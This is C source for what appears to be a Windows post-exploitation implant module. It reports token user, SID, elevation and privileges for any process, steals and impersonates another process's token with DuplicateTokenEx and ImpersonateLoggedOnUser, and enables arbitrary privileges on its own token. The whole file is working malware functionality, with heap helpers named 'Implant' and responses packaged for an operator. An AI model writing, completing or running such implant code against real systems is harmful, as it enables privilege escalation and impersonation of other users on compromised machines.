#include "security.h"

#define WCHAR_NULL_TERMINATOR_COUNT 1U
#define DOMAIN_SEPARATOR_AND_TERMINATOR_COUNT 2U
#define TOKEN_FIELD_FALSE 0U
#define TOKEN_FIELD_TRUE 1U
#define PRIVILEGE_NAME_BUFFER_SIZE 256
/**
 * @brief Builds a TOKEN_SUMMARY response from an already-open token handle.
 *
 * The response contains a TOKEN_SUMMARY_HEADER followed by two UTF-16LE
 * strings: the account name and the SID string. Both strings include their
 * terminating null characters.
 *
 * @param tokenHandle The token to query.
 * @param impersonated Non-zero if the current security context is impersonated.
 * @param responseData Receives the heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
static DWORD BuildTokenSummaryResponseFromToken(
	HANDLE tokenHandle,
	DWORD impersonated,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = ERROR_QUERY_TOKEN_USER_FAILED;
	DWORD tokenUserLength = 0;
	DWORD elevationLength = 0;
	DWORD nameLength = 0;
	DWORD domainLength = 0;
	DWORD totalLength = 0;
	DWORD nameBytes = 0;
	DWORD sidBytes = 0;
	TOKEN_USER* tokenUser = NULL;
	TOKEN_ELEVATION tokenElevation = { 0 };
	SID_NAME_USE sidNameUse = SidTypeUnknown;
	LPWSTR sidString = NULL;
	PWSTR userName = NULL;
	PWSTR domainName = NULL;
	PWSTR accountName = NULL;
	PWSTR responseBuffer = NULL;
	TOKEN_SUMMARY_HEADER* responseHeader = NULL;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	(void)GetTokenInformation(tokenHandle, TokenUser, NULL, 0, &tokenUserLength);
	if (tokenUserLength == 0)
	{
		return ERROR_QUERY_TOKEN_USER_FAILED;
	}

	tokenUser = (TOKEN_USER*)ImplantHeapAlloc(tokenUserLength);
	if (tokenUser == NULL)
	{
		return ERROR_MEMORY_ALLOCATION_FAILED;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenUser,
		tokenUser,
		tokenUserLength,
		&tokenUserLength
	))
	{
		status = ERROR_QUERY_TOKEN_USER_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenElevation,
		&tokenElevation,
		sizeof(tokenElevation),
		&elevationLength
	))
	{
		status = ERROR_QUERY_TOKEN_ELEVATION_FAILED;
		goto cleanup;
	}

	(void)LookupAccountSidW(
		NULL,
		tokenUser->User.Sid,
		NULL,
		&nameLength,
		NULL,
		&domainLength,
		&sidNameUse
	);
	if (nameLength == 0)
	{
		status = ERROR_LOOKUP_ACCOUNT_SID_FAILED;
		goto cleanup;
	}

	userName = (PWSTR)ImplantHeapAlloc((SIZE_T)nameLength * sizeof(WCHAR));
	if (userName == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	domainName = (PWSTR)ImplantHeapAlloc((SIZE_T)domainLength * sizeof(WCHAR));
	if (domainName == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	{
		if (!LookupAccountSidW(
			NULL,
			tokenUser->User.Sid,
			userName,
			&nameLength,
			domainName,
			&domainLength,
			&sidNameUse
		))
		{
			status = ERROR_LOOKUP_ACCOUNT_SID_FAILED;
			goto cleanup;
		}

		if (domainLength > 0)
		{
			size_t userNameLength = wcslen(userName);
			size_t domainNameLength = wcslen(domainName);
			size_t combinedCount =
				domainNameLength +
				userNameLength +
				DOMAIN_SEPARATOR_AND_TERMINATOR_COUNT;

			accountName = (PWSTR)ImplantHeapAlloc(combinedCount * sizeof(WCHAR));
			if (accountName == NULL)
			{
				status = ERROR_MEMORY_ALLOCATION_FAILED;
				goto cleanup;
			}

			if (FAILED(StringCchPrintfExW(
				accountName,
				combinedCount,
				NULL,
				NULL,
				0,
				L"%ls\\%ls",
				domainName,
				userName
			)))
			{
				status = ERROR_FORMAT_ACCOUNT_NAME_FAILED;
				goto cleanup;
			}

			nameBytes =
				((DWORD)wcslen(accountName) + WCHAR_NULL_TERMINATOR_COUNT) *
				sizeof(WCHAR);
		}
		else
		{
			size_t accountNameBytes =
				(wcslen(userName) + WCHAR_NULL_TERMINATOR_COUNT) * sizeof(WCHAR);

			accountName = (PWSTR)ImplantHeapAlloc(accountNameBytes);
			if (accountName == NULL)
			{
				status = ERROR_MEMORY_ALLOCATION_FAILED;
				goto cleanup;
			}

			CopyMemory(accountName, userName, accountNameBytes);
			nameBytes =
				((DWORD)wcslen(accountName) + WCHAR_NULL_TERMINATOR_COUNT) *
				sizeof(WCHAR);
		}
	}

	if (!ConvertSidToStringSidW(tokenUser->User.Sid, &sidString))
	{
		status = ERROR_CONVERT_SID_TO_STRING_FAILED;
		goto cleanup;
	}

	sidBytes =
		((DWORD)wcslen(sidString) + WCHAR_NULL_TERMINATOR_COUNT) *
		sizeof(WCHAR);
	totalLength = sizeof(TOKEN_SUMMARY_HEADER) + nameBytes + sidBytes;

	responseBuffer = (PWSTR)ImplantHeapAlloc(totalLength);
	if (responseBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	responseHeader = (TOKEN_SUMMARY_HEADER*)responseBuffer;
	if (tokenElevation.TokenIsElevated)
	{
		responseHeader->elevated = TOKEN_FIELD_TRUE;
	}
	else
	{
		responseHeader->elevated = TOKEN_FIELD_FALSE;
	}

	responseHeader->impersonated = impersonated;
	responseHeader->userNameLength = nameBytes;
	responseHeader->userSidLength = sidBytes;

	CopyMemory(
		(PBYTE)responseBuffer + sizeof(TOKEN_SUMMARY_HEADER),
		accountName,
		nameBytes
	);
	CopyMemory(
		(PBYTE)responseBuffer + sizeof(TOKEN_SUMMARY_HEADER) + nameBytes,
		sidString,
		sidBytes
	);

	*responseData = (PBYTE)responseBuffer;
	*responseLen = totalLength;
	responseBuffer = NULL;
	status = NO_ERROR;

cleanup:
	if (responseBuffer != NULL)
	{
		ImplantHeapFree(responseBuffer);
	}

	if (accountName != NULL)
	{
		ImplantHeapFree(accountName);
	}

	if (domainName != NULL)
	{
		ImplantHeapFree(domainName);
	}

	if (userName != NULL)
	{
		ImplantHeapFree(userName);
	}

	if (sidString != NULL)
	{
		LocalFree(sidString);
	}

	if (tokenUser != NULL)
	{
		ImplantHeapFree(tokenUser);
	}

	return status;
}

DWORD BuildCurrentTokenSummaryResponse(PBYTE* responseData, DWORD* responseLen)
{
	DWORD status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
	DWORD impersonated = 0;
	HANDLE processToken = NULL;
	HANDLE threadToken = NULL;

	if (responseData != NULL)
	{
		*responseData = NULL;
	}

	if (responseLen != NULL)
	{
		*responseLen = 0;
	}

	if (!OpenProcessToken(GetCurrentProcess(), 
		TOKEN_QUERY, 
		&processToken))
	{
		return ERROR_OPEN_PROCESS_TOKEN_FAILED;
	}

	if (OpenThreadToken(GetCurrentThread(), 
		TOKEN_QUERY, 
		TRUE, 
		&threadToken))
	{
		impersonated = TOKEN_FIELD_TRUE;
		CloseHandle(threadToken);
		threadToken = NULL;
	}
	else if (GetLastError() != ERROR_NO_TOKEN)
	{
		CloseHandle(processToken);
		return ERROR_OPEN_THREAD_TOKEN_FAILED;
	}

	status = BuildTokenSummaryResponseFromToken(
		processToken,
		impersonated,
		responseData,
		responseLen
	);

	CloseHandle(processToken);
	return status;
}

DWORD BuildProcessTokenSummaryResponse(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	DWORD status = NO_ERROR;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;
	TOKEN_TYPE tokenType = TokenPrimary;
	DWORD returnLength = 0;
	DWORD impersonated = TOKEN_FIELD_FALSE;
	PBYTE tokenSummary = NULL;
	DWORD tokenSummaryLen = 0;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;

	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
		FALSE,
		processId);
	if (processHandle == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	if (!OpenProcessToken(processHandle,
		TOKEN_QUERY,
		&tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenType,
		&tokenType,
		sizeof(tokenType),
		&returnLength
	))
	{
		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
		goto cleanup;
	}

	if (tokenType == TokenImpersonation)
	{
		impersonated = TOKEN_FIELD_TRUE;
	}

	status = BuildTokenSummaryResponseFromToken(
		tokenHandle,
		impersonated,
		&tokenSummary,
		&tokenSummaryLen
	);
	if (status != NO_ERROR)
	{
		goto cleanup;
	}

	finalLength = sizeof(DWORD) + tokenSummaryLen;
	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = processId;
	if (tokenSummaryLen > 0)
	{
		CopyMemory(finalBuffer + sizeof(DWORD), tokenSummary, tokenSummaryLen);
	}

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (tokenSummary != NULL)
	{
		ImplantHeapFree(tokenSummary);
	}

	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}

	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}

	if (processHandle != NULL)
	{
		CloseHandle(processHandle);
	}

	return status;
}
//I used GEmini to help me with this function
DWORD BuildTokenPrivilegesResponse(
	DWORD processId,
	PBYTE* responseData,
	DWORD* responseLen
)
{
	UNREFERENCED_PARAMETER(processId);
	DWORD status = NO_ERROR;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;
	PTOKEN_PRIVILEGES tokenPrivileges = NULL;
	DWORD returnLength = 0;
	DWORD i = 0;
	DWORD finalLength = 0;
	PBYTE finalBuffer = NULL;
	DWORD offset = 0;
	DWORD validCount = 0;
	DWORD nameChars = 0;
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
	if (processHandle == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	if (!OpenProcessToken(processHandle, TOKEN_QUERY, &tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	(void)GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &returnLength);
	if (returnLength == 0)
	{
		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
		if (status == NO_ERROR) status = ERROR_INVALID_REQUEST;
		goto cleanup;
	}

	tokenPrivileges = (PTOKEN_PRIVILEGES)ImplantHeapAlloc(returnLength);
	if (tokenPrivileges == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	if (!GetTokenInformation(
		tokenHandle,
		TokenPrivileges,
		tokenPrivileges,
		returnLength,
		&returnLength
	))
	{
		status = ERROR_GET_TOKEN_INFORMATION_FAILED;
		goto cleanup;
	}

	finalLength = sizeof(DWORD) + sizeof(DWORD);

	for (i = 0; i < tokenPrivileges->PrivilegeCount; i++)
	{
		WCHAR nameBuffer[PRIVILEGE_NAME_BUFFER_SIZE];
		nameChars = PRIVILEGE_NAME_BUFFER_SIZE;

		if (LookupPrivilegeNameW(
			NULL,
			&tokenPrivileges->Privileges[i].Luid,
			nameBuffer,
			&nameChars
		))
		{
			finalLength += sizeof(DWORD) + sizeof(DWORD) + (nameChars * sizeof(WCHAR));
		}
	}

	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)(finalBuffer + offset) = processId;
	offset += sizeof(DWORD);
	offset += sizeof(DWORD);

	for (i = 0; i < tokenPrivileges->PrivilegeCount; i++)
	{
		WCHAR nameBuffer[PRIVILEGE_NAME_BUFFER_SIZE];
		nameChars = PRIVILEGE_NAME_BUFFER_SIZE;

		if (LookupPrivilegeNameW(
			NULL,
			&tokenPrivileges->Privileges[i].Luid,
			nameBuffer,
			&nameChars
		))
		{
			DWORD nameBytes = nameChars * sizeof(WCHAR);

			if (offset + sizeof(DWORD) + sizeof(DWORD) + nameBytes > finalLength) break;

			*(DWORD*)(finalBuffer + offset) = tokenPrivileges->Privileges[i].Attributes;
			offset += sizeof(DWORD);
			*(DWORD*)(finalBuffer + offset) = nameBytes;
			offset += sizeof(DWORD);
			CopyMemory(finalBuffer + offset, nameBuffer, nameBytes);
			offset += nameBytes;
			validCount++;
		}
	}

	*(DWORD*)(finalBuffer + sizeof(DWORD)) = validCount;
	*responseData = finalBuffer;
	*responseLen = offset;
	finalBuffer = NULL;

cleanup:
	if (tokenPrivileges != NULL)
	{
		ImplantHeapFree(tokenPrivileges);
	}
	if (finalBuffer != NULL) 
	{
		ImplantHeapFree(finalBuffer);
	}
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}
	if (processHandle != NULL) 
	{
		CloseHandle(processHandle);
	}

	return status;
}

DWORD ImpersonateProcessToken(
	DWORD processId, 
	PBYTE* responseData, 
	DWORD* responseLen
)
{
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;

	DWORD status = NO_ERROR;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;
	HANDLE impToken = NULL;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;

	processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
	if (processHandle == NULL)
	{
		return ERROR_OPEN_PROCESS_FAILED;
	}

	/* Need duplicate rights so we can create an impersonation token */
	if (!OpenProcessToken(processHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}

	/* Duplicate to an impersonation token with SecurityImpersonation level */
	if (!DuplicateTokenEx(
		tokenHandle,
		TOKEN_IMPERSONATE | TOKEN_QUERY,
		NULL,
		SecurityImpersonation,
		TokenImpersonation,
		&impToken))
	{
		status = ERROR_DUPLICATE_TOKEN_FAILED;
		goto cleanup;
	}

	if (!ImpersonateLoggedOnUser(impToken))
	{
		status = ERROR_IMPERSONATE_FAILED;
		goto cleanup;
	}

	finalLength = sizeof(DWORD) + sizeof(DWORD);
	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		/* If impersonation succeeded above, it remains in effect; caller may need to revert. */
		goto cleanup;
	}

	*(DWORD*)finalBuffer = processId;
	*(DWORD*)(finalBuffer + sizeof(DWORD)) = status;

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}

	if (impToken != NULL)
	{
		CloseHandle(impToken);
	}

	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}

	if (processHandle != NULL)
	{
		CloseHandle(processHandle);
	}

	return status;
}

DWORD EnableCurrentTokenPrivilege(
	PCWSTR privilegeName, 
	PBYTE* responseData, 
	DWORD* responseLen)
{
	UNREFERENCED_PARAMETER(privilegeName);
	ASSERT(responseData != NULL);
	ASSERT(responseLen != NULL);

	*responseData = NULL;
	*responseLen = 0;
	//Steps: LookupPrivilegeValue to get the LUID for the privilege name, OpenProcessToken to get the current process token, AdjustTokenPrivileges to enable the privilege, and check for errors.
	LUID luid = { 0 };
	TOKEN_PRIVILEGES tp = { 0 };
	DWORD status = NO_ERROR;
	PBYTE finalBuffer = NULL;
	DWORD finalLength = 0;
	DWORD nameBytes = 0;
	HANDLE processHandle = NULL;
	HANDLE tokenHandle = NULL;

	processHandle = GetCurrentProcess();
	if (!OpenProcessToken(processHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
	{
		status = ERROR_OPEN_PROCESS_TOKEN_FAILED;
		goto cleanup;
	}	

	if (!LookupPrivilegeValueW(NULL, privilegeName, &luid))
	{
		status = ERROR_LOOKUP_PRIVILEGE_VALUE_FAILED;
		goto cleanup;
	}

	tp.PrivilegeCount = 1; // We are only enabling one privilege at a time
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		status = ERROR_ADJUST_TOKEN_PRIVILEGES_FAILED;
		goto cleanup;
	}

	/* Build response: [DWORD status][WCHAR privilegeName with null] */
	nameBytes = (DWORD)((wcslen(privilegeName) + 1) * sizeof(WCHAR));
	finalLength = sizeof(DWORD) + nameBytes;

	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
	if (finalBuffer == NULL)
	{
		status = ERROR_MEMORY_ALLOCATION_FAILED;
		goto cleanup;
	}

	*(DWORD*)finalBuffer = status;
	CopyMemory(finalBuffer + sizeof(DWORD), privilegeName, nameBytes);

	*responseData = finalBuffer;
	*responseLen = finalLength;
	finalBuffer = NULL;

cleanup:
	if (tokenHandle != NULL)
	{
		CloseHandle(tokenHandle);
	}

	if (finalBuffer != NULL)
	{
		ImplantHeapFree(finalBuffer);
	}

	return status;
}